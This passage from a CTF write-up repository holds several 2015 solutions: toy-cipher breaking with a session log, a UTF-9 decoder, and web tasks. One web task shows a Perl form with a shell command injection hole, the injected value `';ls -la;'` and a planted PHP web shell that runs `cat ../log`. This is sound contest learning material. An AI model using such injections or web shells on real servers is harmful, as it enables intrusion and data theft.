9447`\n\n```\nAlphabet is '0123456789abcdef', max len is 64\nYou need to send a string that encrypts to '787fadc8d1944a35b3ed9d1433a9060f'\nGuess 0/21 (Round 1/10)\n```\n\nThe task was to connect with the server and break 10 ciphers (in fact only 7 were unique), using no more than 21 tries.\nBreaking each cipher was proven by sending a message that would encode to the ciphertext selected by server.\nWhole solution is [here](randBox.py) and winning session [here](session.txt)\n\n####Cipher 1\n\nFirst cipher was a standard Caesar cipher, so we need only the information about the `shift`. We get is by sending a single `0` to the server and we get shift as an answer.\n\n```python\ndef breakLevel1(ct, s):\n    # caesar cipher\n    send_via_nc(s, \"0\")\n    data = s.recv(1024)[:-1]\n    shift = int(data, 16)\n    result = \"\".join([format((int(letter, 16) - shift) % 16, \"x\") for letter in ct])\n    send_via_nc(s, result)\n```\n\n####Cipher 2\n\nSecond cipher was a cyclic shift of the input by a random number of positions, dependent on the length of input, so to break it we need to know how many places will the shift be. We get this by sending data with all `0` and a single `1` (with length the same as expected output ciphertext) and the couting how many places the `1` has moved.\n\n```python\ndef breakLevel2(ct, s):\n    # circular shifting input by some random number\n    send_via_nc(s, \"1\" + (\"0\" * (len(ct) - 1)))\n    data = s.recv(1024)[:-1]\n    shift = data.index(\"1\")\n    result = ct[shift:] + ct[:shift]\n    send_via_nc(s, result)\n```\n\n####Cipher 3,4,5\n\nCiphers 3,4,5 were all substitution ciphers and to break them we need to get the substitution table from the server. We do this by sending whole alphabet and reading how each character changed.\n\n```python\ndef breakLevel3(ct, s):\n    # substitution cipher\n    initial = \"0123456789abcdef\"\n    send_via_nc(s, initial)\n    data = s.recv(1024)[:-1]\n    decoder = {data[i]: initial[i] for i in range(len(initial))}\n    result = \"\".join([decoder[letter] for letter in ct])\n    send_via_nc(s, result)\n```\n\n####Cipher 6\n\nCipher 6 is similar to Caesar cipher but the shifts are per position in the plaintext rather than constant for whole text. For example first character is shifted by X, second by Y etc. To get the shifts information we send data with `0` (the same length as expected ciphertext) and we read the shifts on each position directly.\n\n```python\ndef breakLevel6(ct, s):\n    # shifting each number by some distance\n    initial = \"0\" * len(ct)\n    send_via_nc(s, initial)\n    data = s.recv(1024)[:-1]\n    shifts = [int(data[i], 16) for i in range(len(ct))]\n    result = \"\".join([format((int(ct[i], 16) - shifts[i]) % 16, \"x\") for i in range(len(ct))])\n    send_via_nc(s, result)\n```\n\n####Cipher 7\n\nCipher 7 was simply brute-forced by us, because we couldn't figure out the rule. The cipher was calculating next ciphertext element by last two plaintext elements (with random value at position -1), for the most part this was either by adding or subtracting them. However, we couldn't figure out when to add and when to subtract so we simply extracted this from server.\nWe sent requests `000102030405...`, `10111213141516...`, `20212223242526...` and from answers we created a substitution table - for each `previous` value, for each `current` value we knew what will be the ciphertext element. The only missing part was the random value at position -1, which we got by sending `0` and checking which `previous` value would give us the result we got.\n\n```python\n    initial = \"0\"\n    send_via_nc(s, initial)\n    data = s.recv(1024)\n    data = data[:data.index(\"\\n\")]\n    current_number = find_start_number(cracking_map, data)\n    result = \"\"\n    for letter in ct:\n        generator = find_generator(cracking_map, current_number, letter)\n        result += generator\n        current_number = generator\n    send_via_nc(s, result)\n```\n\n####Cipher 8\n\nCipher 8 was adding all previous values of plaintext modulo 16, with random value at position -1. The random value we extract by sendind `0` and taking them directly from result. For the solution we simply encode data, couting how much we are `missing` to get the proper ciphertext value.\n\n```python\ndef breakLevel8(ct, s):\n    # adding current number to previous modulo 16\n    initial = \"0\"\n    send_via_nc(s, initial)\n    data = s.recv(1024)\n    data = data[:data.index(\"\\n\")]\n    previous = int(data, 16)\n    result = \"\"\n    for number in ct:\n        current = int(number, 16)\n        missing = (current - previous) % 16\n        result += format(missing, \"x\")\n        previous = current\n    send_via_nc(s, result)\n```\n\n####Cipher 9\n\nCipher 9 was a substitution cipher with shifting bytes in two-byte words. If X was encoded by 1 and Y by 0 then XY would give 01. To get the substitution map we sent whole alphabet and read the substitutions by shifting bytes in pairs.\n\n```python\ndef breakLevel9(ct, s):\n    # substitution with byte swap, x->1, y->2, xy -> 21\n    initial = \"0123456789abcdef\"\n    send_via_nc(s, initial)\n    data = s.recv(1024)\n    data = data[:data.index(\"\\n\")]\n    substitution = {}\n    for i in range(0, len(initial) - 1, 2):\n        substitution[initial[i + 1]] = data[i]\n        substitution[initial[i]] = data[i + 1]\n    result = \"\"\n    for i in range(0, len(ct) - 1, 2):\n        first = ct[i]\n        second = ct[i + 1]\n        result += substitution[second] + substitution[first]\n    send_via_nc(s, result)\n```\n\nDuring the competition the ordering of ciphers was changed and some ciphers were used multiple times, hence there were only 7 unique ciphers, not 10.\n\n```\nYou need to send a string that encrypts to 'd689c1a78e419dc1043ff07a0afc01d8'\nGuess 18/21 (Round 10/10)\n\nciphertext = d689c1a78e419dc1043ff07a0afc01d8\nsending 0\nsending 17f6ab16e045c1dcc8b4bbc66c3ffe3b\nGuess 19/21 (Round 10/10)\nd689c1a78e419dc1043ff07a0afc01d8\nYou got it!\n9447{crYpt0_m4y_n0T_Be_S0_haRD}\n```", "timestamp": "2025-10-21T22:03:22.616206"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-11-28-9447/randBox/session.txt", "url": "https://github.com/p4-team/ctf/blob/master/2015-11-28-9447/randBox/session.txt", "content": "Alphabet is '0123456789abcdef', max len is 64\nYou need to send a string that encrypts to '787fadc8d1944a35b3ed9d1433a9060f'\nGuess 0/21 (Round 1/10)\n\nciphertext = 787fadc8d1944a35b3ed9d1433a9060f\nsending 10000000000000000000000000000000\nsending 4a35b3ed9d1433a9060f787fadc8d194\nGuess 1/21 (Round 1/10)\n787fadc8d1944a35b3ed9d1433a9060f\nYou got it!\nYou need to send a string that encrypts to 'b88f17fb0934a1e191459e88aa4ee2f6'\nGuess 2/21 (Round 2/10)\n\nciphertext = b88f17fb0934a1e191459e88aa4ee2f6\nsending 0123456789abcdef\nsending a99e06ea1825b0f080548f99bb5ff3e7\nGuess 3/21 (Round 2/10)\nb88f17fb0934a1e191459e88aa4ee2f6\nYou got it!\nYou need to send a string that encrypts to 'f98c916fcd72efe7ca81cfa622824995'\nGuess 4/21 (Round 3/10)\n\nciphertext = f98c916fcd72efe7ca81cfa622824995\nsending 0123456789abcdef\nsending 9feaf709ab148981ace7a9c044e42ff3\nGuess 5/21 (Round 3/10)\nf98c916fcd72efe7ca81cfa622824995\nYou got it!\nYou need to send a string that encrypts to 'a2c34da98257dc1a76dc884b8bfb3aac'\nGuess 6/21 (Round 4/10)\n\nciphertext = a2c34da98257dc1a76dc884b8bfb3aac\nsending 0123456789abcdef\nsending a2c34da98257dc1a76dc884b8bfb3aac\nGuess 7/21 (Round 4/10)\na2c34da98257dc1a76dc884b8bfb3aac\nYou got it!\nYou need to send a string that encrypts to '440646d0a5994a5c90c2797c4f41bd04'\nGuess 8/21 (Round 5/10)\n\nciphertext = 440646d0a5994a5c90c2797c4f41bd04\nsending 00000000000000000000000000000000\nsending 20aeaaf08131ae7c7c6add9c2be91124\nGuess 9/21 (Round 5/10)\n440646d0a5994a5c90c2797c4f41bd04\nYou got it!\nYou need to send a string that encrypts to '62a15f41bf289ccc926bd65ae9909fb3'\nGuess 10/21 (Round 6/10)\n\nciphertext = 62a15f41bf289ccc926bd65ae9909fb3\nsending 0\nsending a6e59385f36cd000d6af1a9e2dd4d3f7\nGuess 11/21 (Round 6/10)\n62a15f41bf289ccc926bd65ae9909fb3\nYou got it!\nBegin hard rounds!\nYou need to send a string that encrypts to '4cb1d78b6e4294bc8858042798ea126e'\nGuess 12/21 (Round 7/10)\n\nciphertext = 4cb1d78b6e4294bc8858042798ea126e\nsending 0\nsending 3f458f7ca402bf4808d55134d5b1024a\nGuess 13/21 (Round 7/10)\n4cb1d78b6e4294bc8858042798ea126e\nYou got it!\nYou need to send a string that encrypts to '46afd8f5a23569eebe826814d117da84'\nGuess 14/21 (Round 8/10)\n\nciphertext = 46afd8f5a23569eebe826814d117da84\nsending 0\nsending 1245eb7658121350d3aa429394066dec\nGuess 15/21 (Round 8/10)\n46afd8f5a23569eebe826814d117da84\nYou got it!\nYou need to send a string that encrypts to '219816a5c80db4fa026bf2b9cc5e4f07'\nGuess 16/21 (Round 9/10)\n\nciphertext = 219816a5c80db4fa026bf2b9cc5e4f07\nsending 0123456789abcdef\nsending 0398704b9dc15abe31a73e8addf4e561\nGuess 17/21 (Round 9/10)\n219816a5c80db4fa026bf2b9cc5e4f07\nYou got it!\nYou need to send a string that encrypts to 'd689c1a78e419dc1043ff07a0afc01d8'\nGuess 18/21 (Round 10/10)\n\nciphertext = d689c1a78e419dc1043ff07a0afc01d8\nsending 0\nsending 17f6ab16e045c1dcc8b4bbc66c3ffe3b\nGuess 19/21 (Round 10/10)\nd689c1a78e419dc1043ff07a0afc01d8\nYou got it!\n9447{crYpt0_m4y_n0T_Be_S0_haRD}", "timestamp": "2025-10-21T22:03:22.739660"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-11-28-9447/sanutf8y_check/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-11-28-9447/sanutf8y_check/README.md", "content": "##sanutf8y_check (web, 1p)\n\n###PL\n[ENG](#eng-version)\n\nPo wejściu na stronę ukazuje nam się:\n\n![](sanutf8y_check.png)\n\nNie możemy skopiować tego tekstu ze strony ponieważ są to jedynie dziwne unicodowe znaki wyglądające jak litery. Musimy więc przepisać flagę:\n\n9447{ThiS_iS_what_A_flAg_Looks_LIke}\n\n### ENG version\n\nWhen we enter given website we see:\n\n![](sanutf8y_check.png)\n\nWe can't simply copy this text from webpage since those are strange unicode symbols resembling ascii characters. We need to type down the flag:\n\n9447{ThiS_iS_what_A_flAg_Looks_LIke}\n", "timestamp": "2025-10-21T22:03:22.984295"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-12-05-seccon/4042_crypto_100/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-12-05-seccon/4042_crypto_100/README.md", "content": "##4042 (Misc/Crypto, 100p)\n\n```\nUnknown document is found in ancient ruins, in 2005.\nCould you figure out what is written in the document?\n```\n\n###PL\n[ENG](#eng-version)\n\nDostajemy [plik](no-network.txt) który mamy zdekodować. Podpowiedź stanowi `4042` oraz rok `2005`. Pozwala nam to dotrzeć do RFC4042: https://www.ietf.org/rfc/rfc4042.txt które w ramach żartu opisuje kodowanie UTF-9.\nDomyślamy się, że właśnie z takim kodowaniem mamy do czynienia i w celu odczytania flagi musimy napisać dekoder.\nKażdy znak jest kodowany na 9 bitach, gdzie najstarszy bit oznacza że znak jest kontynuowany na kolejnym bajcie. Pozostałe bity określają znak.\nPiszemy więc prosty kod:\n\n```python\ndef convert_single_char(start_pos, bits):\n    end_pos = 9\n    continuation = int(bits[start_pos])\n    character = bits[start_pos + 1:start_pos + 9]\n    c = int(character, 2)\n    if continuation:\n        character = bits[start_pos + 9:start_pos + 18]\n        c <<= 8\n        c += int(character, 2)\n        end_pos += 9\n    return unichr(c), end_pos\n```\nKtóry dla ciągu bitów oraz pozycji startowej zwraca zdekodowany znak oraz ostanią użytą pozycję.\nDane wejściowe traktujemy jako liczbę w systemie ósemkowym a następnie dekodujemy za pomocą przygotowanego [skryptu](4042.py).\nW efekcie dostajemy flagę:\n\n![](flag.png)\n\nczyli:\n\n`SECCON{A_GROUP_OF_NINE_BITS_IS_CALLED_NONET}`\n\n### ENG version\n\nWe get [a file](no-network.txt) which we are supposed to decode. \nA starting point is `4042` and year `2005`. This leads us to RFC4042: https://www.ietf.org/rfc/rfc4042.txt which is a joke describing UTF-9 encoding.\nWe assume we will have to decode input file using this strange encoding so we need a decoder.\nEach character is encoded on 9 bits, where the most significant bit signals that the character is continued on another byte. Rest of the bits are left for the data itself.\n\nWe make a simple decoder:\n\n```python\ndef convert_single_char(start_pos, bits):\n    end_pos = 9\n    continuation = int(bits[start_pos])\n    character = bits[start_pos + 1:start_pos + 9]\n    c = int(character, 2)\n    if continuation:\n        character = bits[start_pos + 9:start_pos + 18]\n        c <<= 8\n        c += int(character, 2)\n        end_pos += 9\n    return unichr(c), end_pos\n```\nWhich takes a list of bits and start position and returns a chracter and index of last used position.\nWe treat input data as a large oct number and decode with prepared [script](4042.py).\nAs a result we get:\n\n![](flag.png)\n\nwhich is:\n\n`SECCON{A_GROUP_OF_NINE_BITS_IS_CALLED_NONET}`", "timestamp": "2025-10-21T22:03:23.687686"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-12-05-seccon/4042_crypto_100/no-network.txt", "url": "https://github.com/p4-team/ctf/blob/master/2015-12-05-seccon/4042_crypto_100/no-network.txt", "content": "423336454237162404065441177440057404126404100404125442052441177240441176403277441\n174403277162440006404125404126164440005402121441177404065164777014440000404101415\n040431122404125431161404101164404065164431131162440010402121405001441160404100441\n160404125404126441175441160431122402141440012404065441174404126164777014440003404\n125404065405001440002441176404076240431161404126431131404125441177415040441176240\n164404065441177404100454237162440006012404126431122403362404126405001404126405001\n431131431122164440006431131164440006441174404060142415040162404065440057404065164\n440012441176404076441174415040162431161440000441177402121402141431122402121440007\n402121441174404126161431131404060777016440007125164440003404065431122404126441177\n440011402121405001440012441177404126431122441160441177440001442301431161431122404\n126402121441177440032440012161431131404126404125440005012431122403277404125164162\n431131405001440000404065441171431161162403362441160164402121164404126454237431122\n440137431131441174441174402121441177403362404076440007441174404060142403277162441\n160404125440057431122404126404125441160440137431131164440002402121441174441160161\n431131441160404100440137431161454255440012431161404060440006404101403277441177441\n177404076405001403277440137441175415040431122404125404065161431131404060164440044\n440003012425352431131404126404125440011402121431131164404065240404126162431131162\n404065440007441176415040441174415040162440002441160431122240162431161404100162431\n161404273404065431122405001404065162404126164440137404126431122440007442301403277\n441174431131404100164402121164404065440007442050404065441174404126164440001404065\n404125404125431161440001403362441160441174441174431131441177440001405001403277441\n174403277162404065440007404065431131440010012146431131402141404126402121164240431\n122431131441174441174404060440012404100402121162441160404060164442052162777016440\n006403225441171403362431161454243164404065431131162440007404125404126431122164440\n005403277404101403362402121431161441175404060164440001403362442052454243404126441\n176402121164404060164440005431122454237431122440011454243162415040404126441176431\n161431122164777014440005404125431131431122164440007441160431122440011012404101431\n131441174404100404060440002161431131441160440011404076146146404126441175404126402\n121440007405001404065404125404065162431131431122164440011441177404076441174441174\n441160164240402121431122404126441177240404126441176440001404065404125164440010441\n174402121142454237162442052441177440044012012403244404273431161240146441174402121\n402141440010441160404125426354440000404005403225441155454244404036403235777133403\n221777077405014423241454236125403241402315404036425264446212403235441140403235403\n225402315404022441140403244423332402315441140423332777077404041423252441154441154\n423254441156402315403235404036403235404025403244776134012012403235423364777033240\n403241441174404065402121404125404065440010404125404065431122441176440003164404273\n404065440004146441174402121402141440003404126431122440011431122454237162441177402\n121441174440011404020423332403371404006441140440002403362404076405001404065440010\n776024776132012\n", "timestamp": "2025-10-21T22:03:23.832235"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-12-05-seccon/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-12-05-seccon/README.md", "content": "# Writeup SECCON CTF 2015\n\nUczestniczyliśmy (cr019283, c7f.m0d3, msm, Rev, other019, nazywam i Shalom) w SECCON CTF 2015, i znowu spróbujemy opisać zadania z którymi walczyliśmy (a przynajmniej te, które pokonaliśmy).\n\n![](results.png)\n\n### Spis treści:\n* [Start SECCON CTF (Exercises)\t50](start_seccon_50)\n* [SECCON WARS 2015 (Stegano) 100](seccon_wars_100)\n* [Unzip the file (Crypto) 100]\n* [Fragment2 (Web/Network) 200]\n* [Connect the server (Web/Network) 100](connect_web_100)\n* [Command-Line Quiz (Misc) 100](quiz_100)\n* [Entry form (Web/Network) 100](entry_form_web_100)\n* [Bonsai XSS Revolutions (Web/Network) 200](bonsai_xss_revolutions_web_200)\n* [Exec dmesg (Binary/Reverse) 300]\n* [Decrypt it (Crypto) 300]\n* [QR puzzle: Web (Misc) 400](qr_web_400)\n* [QR puzzle: Nonogram (Misc) 300](qr_nonogram_300)\n* [QR puzzle: Windows (Unknown) 200](qr_windows_200)\n* [Reverse-Engineering Android APK 1 (Misc) 400]\n* [Find the prime numbers (Crypto) 200](paillier_crypto_200)\n* [Micro computer exploit code challenge (Exploit) 300]\n* [GDB Remote Debugging (Binary/Reverse) 200]\n* [FSB: TreeWalker (Exploit) 200]\n* [Steganography 1 (Stegano) 100](stegano_1_100)\n* [Steganography 2 (Stegano) 100]\n* [Steganography 3 (Stegano) 100](stegano_3_100)\n* [4042 (Misc/Crypto) 100](4042_crypto_100)\n* [Individual Elebin (Binary/Reverse) 200]\n* [Last Challenge (Thank you for playing) (Exercises/Crypto) 50](last_crypto_50)\n\n", "timestamp": "2025-10-21T22:03:23.938455"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-12-05-seccon/bonsai_xss_revolutions_web_200/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-12-05-seccon/bonsai_xss_revolutions_web_200/README.md", "content": "##Bonsai XSS Revolutions (Web/Network, 200p)\n\n>What is your browser(User-Agent)?  \n>[hakoniwaWebMail_20151124.zip](hakoniwaWebMail_20151124.zip)  \n>Requirement:.NET Framework 4.5\n\n###PL\n[ENG](#eng-version)\n\nZałączona do zadania była mocno zobfuskowana aplikacja .NETowa. Była to symulacja przeglądarki, w której użytkownik logował się do swojej poczty.\n\n![](./app.png)\n\nZ początku postanowiliśmy powalczyć z samą aplikacją. Częściowo udało nam sie zdeobfuskować plik wykonywalny narzędziem `de4dot`. Następnie utworzyliśmy nową aplikację .NETową i załadowaliśmy oryginalny program za pomocą refleksji:\n\n```csharp\nvar assembly = Assembly.LoadFile(\"hakoniwaWebMail.exe\");\n```\n\nTo pozwoliło nam ręcznie tworzyć instancje klas i wywoływać metody. W głównej przestrzeni nazw były dwie formy: `FLAGgenerator` i `frmMain`. Pierwsza dała nam flagę, ale była fejkowa. Druga była faktycznie główną formą aplikacji i stworzenie jej instancji oraz pokazanie jej równało się wywołaniu całej naszej symulacji - z tą różnicą, że teraz mogliśmy się z nią pobawić:\n\n```csharp\nvar form = (hakoniwaWebMail.frmMain)Activator.CreateInstance(assembly.GetTypes()[7]);\nvar browser = (WebBrowser)GetControls(form)[7];\n```\n\nDzięki temu mogliśmy zrzucić zawartość wyświetlonej strony w zintegrowanej/symulowanej przeglądarce:\n\n```csharp\nConsole.WriteLine(browser.DocumentText);\n```\n\nAle jedyne co dostaliśmy to:\n\n```html\n<html><style>.b{font-weight:bold;}(...)</style><body>\n<script>var navigator=new Object;navigator.userAgent='This is NOT a flag. Use XSS to obtain it.';</script>\n<table border=3 cellspacing=0 cellpadding=0 width=100% height=100%>(...)\n```\n\nJedną możliwością na tym etapie było zagłębienie się w zaobfuskowaną aplikację i zreverseengineerowanie jej, a drugą było przeczytanie jeszcze raz nazwy zadania, jej kategorii oraz punktów: XSS, web, 200p. No więc, jeżeli aplikacja faktycznie była symulowanym webmailem to może da się wysłać tam maila. I faktycznie tak było: był to również serwer pocztowy działający na standardowym porcie 25:\n\n```\nTCP    127.0.0.1:25           0.0.0.0:0              LISTENING       6512\n[hakoniwaWebMail.exe]\n```\n\nPróbowaliśmy XSS na kilku z nagłówków w wiadomości aż w końcu zadziałał z polem `Date`.\n\n![](./solution.png)\n\n`SECCON{TsuriboriWebBros/2015.12.17620}\n\n\n### ENG version\n\nAttached was a heavily obfuscated .NET application. It was a simulated webbrowser in which a user logged in to his webmail.\n\n![](./app.png)\n\nAt first we tried to tacke the application itself. We partly managed to deobfuscate the binary with a `de4dot` tool. Then we created another .NET application and loaded the original program by reflection:\n\n```csharp\nvar assembly = Assembly.LoadFile(\"hakoniwaWebMail.exe\");\n```\n\nThat allows us to manually instantiate classes and invoke methods. There were two form classes in the main namespace: `FLAGgenerator` and `frmMain`. The former gave us a flag, but it was a fake. The former was indeed the main form of the app and instantiating the class and showing the form basically run the whole simulation but now we could interact with it:\n\n```csharp\nvar form = (hakoniwaWebMail.frmMain)Activator.CreateInstance(assembly.GetTypes()[7]);\nvar browser = (WebBrowser)GetControls(form)[7];\n```\n\nThat way we could simply dump the contents of displayed page in the integrated/simulated webbrowser:\n\n```csharp\nConsole.WriteLine(browser.DocumentText);\n```\n\nBut all we got was:\n\n```html\n<html><style>.b{font-weight:bold;}(...)</style><body>\n<script>var navigator=new Object;navigator.userAgent='This is NOT a flag. Use XSS to obtain it.';</script>\n<table border=3 cellspacing=0 cellpadding=0 width=100% height=100%>(...)\n```\n\nOne possibility at this point was to dig deep in the obfuscated application and reverse engineer it and another to read the task name, category and points again: XSS, web, 200p. Well then, if the application is a simulated webmail, maybe we can send an actual email. And there it was: it was also a mail server running on standard port 25:\n\n```\nTCP    127.0.0.1:25           0.0.0.0:0              LISTENING       6512\n[hakoniwaWebMail.exe]\n```\n\nWe tried several mail headers for the XSS and it finally worked with the `Date` header.\n\n![](./solution.png)\n\n`SECCON{TsuriboriWebBros/2015.12.17620}\n", "timestamp": "2025-10-21T22:03:24.199046"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-12-05-seccon/connect_web_100/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-12-05-seccon/connect_web_100/README.md", "content": "##Connect the server (Web/Network, 100p)\n\n```\nlogin.pwn.seccon.jp:10000\n```\n\n###PL\n[ENG](#eng-version)\n\nPo połączeniu się z serwerem za pomocą nc dostajemy:\n\n![](conection.png)\n\nWpisanie dowolnego loginu także nie daje żadnych efektów. Próbowaliśmy podejść do tego zadania z różnych stron, bez efektów. W końcu uznaliśmy, że skoro zadanie wspomina o wolnym połączeniu to może spróbujemy ataku czasowego albo próby wyczerpania wątków serwera. Jednak w trakcie pisania skryptu zauważyliśmy dość dziwny wynik:\n\n```\nb'CONNECT 300\\r\\n\\r\\nWelcome to SECCON server.\\r\\n\\r\\nThe server is connected via slow dial-up connection.\\r\\nPlease be patient, and do not brute-force.\\r\\nS\\x08 \\x08E\\x08 \\x08C\\x08 \\x08C\\x08 \\x08O\\x08 \\x08N\\x08 \\x08{\\x08 \\x08S\\x08 \\x08o\\x08 \\x08m\\x08 \\x08e\\x08 \\x08t\\x08 \\x08i\\x08 \\x08m\\x08 \\x08e\\x08 \\x08s\\x08 \\x08_\\x08 \\x08w\\x08 \\x08h\\x08 \\x08a\\x08 \\x08t\\x08 \\x08_\\x08 \\x08y\\x08 \\x08o\\x08 \\x08u\\x08 \\x08_\\x08 \\x08s\\x08 \\x08e\\x08 \\x08e\\x08 \\x08_\\x08 \\x08i\\x08 \\x08s\\x08 \\x08_\\x08 \\x08N\\x08 \\x08O\\x08 \\x08T\\x08 \\x08_\\x08 \\x08w\\x08 \\x08h\\x08 \\x08a\\x08 \\x08t\\x08 \\x08_\\x08 \\x08y\\x08 \\x08o\\x08 \\x08u\\x08 \\x08_\\x08 \\x08g\\x08 \\x08e\\x08 \\x08t\\x08 \\x08}\\x08 \\x08\\r\\nlogin: '\n```\n\nNaszą uwagę zwróciły niepiśmienne znaki o numerze ascii 8, czyli backspace. Otóż serwer wypisywał flagę, ale było to niewidoczne w konsoli.\n\n`SECCON{Sometimes_what_you_see_is_NOT_what_you_get}`\n\n### ENG version\n\nAfter connecting with nc we get:\n\n![](conection.png)\n\nUsing any login doesn't help us moving forward with the task. We tried different approaches but to no avail. Finally we decided that, since the task mentions and weak slow connection, we could try a timing attack or try to exhaust server threads. However, while writing a script we noticed a strange data coming from server:\n\n```\nb'CONNECT 300\\r\\n\\r\\nWelcome to SECCON server.\\r\\n\\r\\nThe server is connected via slow dial-up connection.\\r\\nPlease be patient, and do not brute-force.\\r\\nS\\x08 \\x08E\\x08 \\x08C\\x08 \\x08C\\x08 \\x08O\\x08 \\x08N\\x08 \\x08{\\x08 \\x08S\\x08 \\x08o\\x08 \\x08m\\x08 \\x08e\\x08 \\x08t\\x08 \\x08i\\x08 \\x08m\\x08 \\x08e\\x08 \\x08s\\x08 \\x08_\\x08 \\x08w\\x08 \\x08h\\x08 \\x08a\\x08 \\x08t\\x08 \\x08_\\x08 \\x08y\\x08 \\x08o\\x08 \\x08u\\x08 \\x08_\\x08 \\x08s\\x08 \\x08e\\x08 \\x08e\\x08 \\x08_\\x08 \\x08i\\x08 \\x08s\\x08 \\x08_\\x08 \\x08N\\x08 \\x08O\\x08 \\x08T\\x08 \\x08_\\x08 \\x08w\\x08 \\x08h\\x08 \\x08a\\x08 \\x08t\\x08 \\x08_\\x08 \\x08y\\x08 \\x08o\\x08 \\x08u\\x08 \\x08_\\x08 \\x08g\\x08 \\x08e\\x08 \\x08t\\x08 \\x08}\\x08 \\x08\\r\\nlogin: '\n```\n\nWe focused on the acii characters number 8 - backspace. The server was printing a flag but we simply didn't see that in the console.\n\n`SECCON{Sometimes_what_you_see_is_NOT_what_you_get}`\n", "timestamp": "2025-10-21T22:03:24.459721"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-12-05-seccon/entry_form_web_100/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-12-05-seccon/entry_form_web_100/README.md", "content": "##Entry form (Web/Network, 100p)\n\n```\nhttp://entryform.pwn.seccon.jp/register.cgi\n\n(Do not use your real mail address.)\n```\n\n###PL\n[ENG](#eng-version)\n\nFormularz pod podanym linkiem pozwalał nam na podanie adresu e-mail oraz nazwy użytkownika. Po wysłaniu podziękował nam za podanie informacji, ale w rzeczywistości niczego nie wysyłał. Krótka zabawa z modyfikacją wartości niczego nam nie dała więc postanowiliśmy się rozejrzeć. Okazało się, że serwer webowy ma włączone listowanie i pod `http://entryform.pwn.seccon.jp/` znaleźliśmy dodatkowo katalog `SECRETS` oraz plik `register.cgi_bak`. Pierwszy katalog nie był dostępny, ale drugi z plików dał nam kod źródłowy naszego formularza.\n\nNajciekawsza część wyglądała następująco:\n\n```perl\nif($q->param(\"mail\") ne '' && $q->param(\"name\") ne '') {\n  open(SH, \"|/usr/sbin/sendmail -bm '\".$q->param(\"mail\").\"'\");\n  print SH \"From: keigo.yamazaki\\@seccon.jp\\nTo: \".$q->param(\"mail\").\"\\nSubject: from SECCON Entry Form\\n\\nWe received your entry.\\n\";\n  close(SH);\n\n  open(LOG, \">>log\"); ### <-- FLAG HERE ###\n  flock(LOG, 2);\n  seek(LOG, 0, 2);\n  print LOG \"\".$q->param(\"mail\").\"\\t\".$q->param(\"name\").\"\\n\";\n  close(LOG);\n\n  print \"<h1>Your entry was sent. <a href='?' style='color:#52d6eb'>Go Back</a></h1>\";\n  exit;\n}\n```\n\nJest to skrypt w Perlu, w którym od razu rzuca się w oczy możliwość wywołania własnego polecenia zawierając go w parametrze `mail`.\n\nPotwierdza nam to wysłanie `';ls -la;'`. Według kodu źródłowego flagę mamy znaleźć w pliku `log`. Niestety wygląda na to, że skrypt perlowy nie ma praw do jego odczytania. W takim razie sprawdziliśmy co znajdowało się w uprzednio niedostępnym dla nas katalogu `SECRETS`. Znajdował się tam plik `backdoor123.php` o prostym kodzie: `<pre><?php system($_GET['cmd']); ?></pre>`. Wywołanie w nim polecenia `cat ../log` dało nam flagę:\n\n`SECCON{Glory_will_shine_on_you.}`\n\n### ENG version\n\nOpening the provided link gave us a form asking for an e-mail and a username. After submitting it displayed a thank you message, but didn't really sent us anything. After some time playing with the values we decided to look around. It turned out that the webserver had listing enabled and going to `http://entryform.pwn.seccon.jp/` gave us a `SECRETS` directory and a `register.cgi_bak` file. The former wasn't available, but the latter file gave us a source code of our form.\n\nThe most interesing part was the following:\n\n```perl\nif($q->param(\"mail\") ne '' && $q->param(\"name\") ne '') {\n  open(SH, \"|/usr/sbin/sendmail -bm '\".$q->param(\"mail\").\"'\");\n  print SH \"From: keigo.yamazaki\\@seccon.jp\\nTo: \".$q->param(\"mail\").\"\\nSubject: from SECCON Entry Form\\n\\nWe received your entry.\\n\";\n  close(SH);\n\n  open(LOG, \">>log\"); ### <-- FLAG HERE ###\n  flock(LOG, 2);\n  seek(LOG, 0, 2);\n  print LOG \"\".$q->param(\"mail\").\"\\t\".$q->param(\"name\").\"\\n\";\n  close(LOG);\n\n  print \"<h1>Your entry was sent. <a href='?' style='color:#52d6eb'>Go Back</a></h1>\";\n  exit;\n}\n```\n\nIt's a Perl script and the first thing that comes to mind is the possibility of a bash command injection in the `mail` parameter.\n\nWe confirm it by sending `';ls -la;'`. According to the source code we were supposed to find the flag in the `log` file. Unfortunately it seemed that the Perl script didn't have a read access. In that case we tried accessing the previousely inaccessible `SECRETS` directory. There was a `backdoor123.php` file with a very simple source code: `<pre><?php system($_GET['cmd']); ?>`. Invoking a `cat ../log` gave us the flag:\n\n`SECCON{Glory_will_shine_on_you.}`\n", "timestamp": "2025-10-21T22:03:24.800516"}
